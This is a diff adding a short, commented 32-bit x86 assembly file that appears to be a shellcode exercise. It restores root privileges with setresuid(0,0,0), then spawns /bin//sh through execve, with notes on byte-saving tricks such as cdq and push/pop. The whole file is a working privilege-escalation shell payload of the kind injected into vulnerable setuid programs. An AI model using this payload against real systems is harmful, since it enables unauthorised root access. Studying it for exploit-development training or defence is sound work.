@@ -1,0 +1,34 @@
+; cdq ---> converts double word to quad word this instruction gets it's source results from eax and stores the result between eax and edx 
+; it uses one byte only 
+
+; another trick is since the stack is 32-bit allgined when the value is poped of from the stack it's will be filled 
+; the entire register 
+
+BITS 32
+
+section .text
+
+global _start
+
+_start:
+			;ebx 		ecx 		edx 		
+;setresuid(uid_t ruid, uid_t ruid, eid_t suid)
+xor eax , eax ; zero out eax rigister
+xor ebx, ebx ; zero out ebx rigister
+xor ecx, ecx ; zero out ecx rigister
+cdq ; 
+mov BYTE al, 0xa4 ; mov the syscall setresuid of this byte to the lower byte part of eax 
+int 0x80 ; call ;setresuid(0, 0, 0)
+
+;execve(const char *filename,  char *const argv[], char *const envp[])
+push BYTE 11; push 11 to the stack 
+pop eax ; pop the dword of 11 into eax 
+push ecx ; for null termination 
+push 0x68732f2f; push "//sh" 
+push 0x6e69622f; push "/bin" 
+mov ebx, esp ; the ebx now points to /bin//sh
+push ecx; for null termination 
+mov edx, esp ; the edx now points to null termination [the usage here for en empty array]
+push ebx; push the string address above the null termination 
+mov ecx, esp ; this argv array with string pointer 
+int 0x80; ;execve(/bin//sh, [/bin//sh], [NULL])
